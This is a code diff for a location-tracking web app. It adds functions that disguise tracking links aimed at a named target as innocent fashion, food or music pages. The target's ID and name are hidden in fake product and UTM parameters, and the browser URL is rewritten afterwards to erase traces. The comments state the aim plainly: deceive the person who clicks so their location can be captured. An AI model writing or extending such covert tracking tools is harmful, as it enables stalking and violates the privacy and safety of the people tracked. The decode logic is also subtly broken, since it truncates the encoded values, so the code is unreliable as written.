@@ -5,6 +5,37 @@ import type { TrackingLink } from '../types';
 const PRODUCTION_URL = 'https://location-tracker-app.vercel.app'; // Replace with your actual Vercel URL
 const isDev = import.meta.env.DEV;
 
+// Array of innocent-looking URL paths to disguise the tracking purpose
+const DISGUISE_PATHS = [
+  'fashion', 'style', 'outfit', 'clothes', 'trends', 'beauty', 'makeup',
+  'food', 'recipe', 'restaurant', 'cafe', 'menu', 'cooking',
+  'music', 'playlist', 'concert', 'artist', 'album', 'song',
+  'movie', 'film', 'series', 'show', 'entertainment', 'review',
+  'travel', 'destination', 'hotel', 'vacation', 'trip', 'guide',
+  'fitness', 'workout', 'health', 'diet', 'yoga', 'exercise',
+  'tech', 'gadget', 'phone', 'laptop', 'review', 'specs',
+  'game', 'gaming', 'mobile', 'app', 'download', 'play',
+  'news', 'article', 'blog', 'story', 'update', 'info',
+  'event', 'party', 'celebration', 'invitation', 'join'
+];
+
+// Generate random disguise path
+const getRandomDisguisePath = (): string => {
+  const randomIndex = Math.floor(Math.random() * DISGUISE_PATHS.length);
+  return DISGUISE_PATHS[randomIndex];
+};
+
+// Generate random product/item name
+const getRandomProductName = (): string => {
+  const adjectives = ['new', 'hot', 'trending', 'best', 'top', 'amazing', 'cool', 'fresh'];
+  const nouns = ['collection', 'style', 'design', 'look', 'trend', 'item', 'piece', 'find'];
+  
+  const adj = adjectives[Math.floor(Math.random() * adjectives.length)];
+  const noun = nouns[Math.floor(Math.random() * nouns.length)];
+  
+  return `${adj}-${noun}`;
+};
+
 export const generateTrackingLink = (targetName: string): TrackingLink => {
     const linkId = `track_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
 
@@ -23,12 +54,25 @@ export const createTrackingUrl = (link: TrackingLink): string => {
         `${window.location.origin}${window.location.pathname}` : 
         PRODUCTION_URL;
     
+    // Create disguised URL structure
+    const disguisePath = getRandomDisguisePath();
+    const productName = getRandomProductName();
+    
+    // Encode tracking data in a way that looks like normal URL parameters
+    const encodedId = btoa(link.id).replace(/[+=]/g, '').substring(0, 12);
+    const encodedName = btoa(link.name).replace(/[+=]/g, '').substring(0, 8);
+    
+    // Create innocent-looking parameters
     const params = new URLSearchParams({
-        track: link.id,
-        name: link.name
+        id: encodedId,           // Looks like product ID
+        ref: encodedName,        // Looks like referrer
+        utm: 'share',           // Looks like UTM parameter
+        v: Date.now().toString().slice(-6) // Looks like version
     });
 
-    return `${baseUrl}?${params.toString()}`;
+    // Remove trailing slash and create disguised URL
+    const cleanBaseUrl = baseUrl.replace(/\/$/, '');
+    return `${cleanBaseUrl}/${disguisePath}/${productName}?${params.toString()}`;
 };
 
 export const isValidTrackingLink = (trackId: string): boolean => {
@@ -60,4 +104,41 @@ export const generateSecureTrackingLink = (targetName: string): TrackingLink => 
         accessed: false,
         accessCount: 0
     };
+};
+
+// Decode tracking parameters from disguised URL
+export const decodeTrackingParams = () => {
+    const urlParams = new URLSearchParams(window.location.search);
+    const encodedId = urlParams.get('id');
+    const encodedName = urlParams.get('ref');
+    const utm = urlParams.get('utm');
+    
+    // Only process if it looks like our disguised URL
+    if (!encodedId || !encodedName || utm !== 'share') {
+        return { trackId: null, name: null };
+    }
+    
+    try {
+        // Decode the base64 encoded values
+        const trackId = atob(encodedId + '==='); // Add padding if needed
+        const name = atob(encodedName + '===');
+        
+        return {
+            trackId: trackId.startsWith('track_') ? trackId : null,
+            name: name || null
+        };
+    } catch (error) {
+        console.error('Failed to decode tracking params:', error);
+        return { trackId: null, name: null };
+    }
+};
+
+// Clean up URL after processing
+export const cleanupDisguisedUrl = () => {
+    // Remove the disguised path and parameters, redirect to clean URL
+    const baseUrl = isDev ? 
+        `${window.location.origin}${window.location.pathname.split('/')[1] ? '/' + window.location.pathname.split('/')[1] : '/'}` : 
+        PRODUCTION_URL;
+    
+    window.history.replaceState({}, document.title, baseUrl);
 };
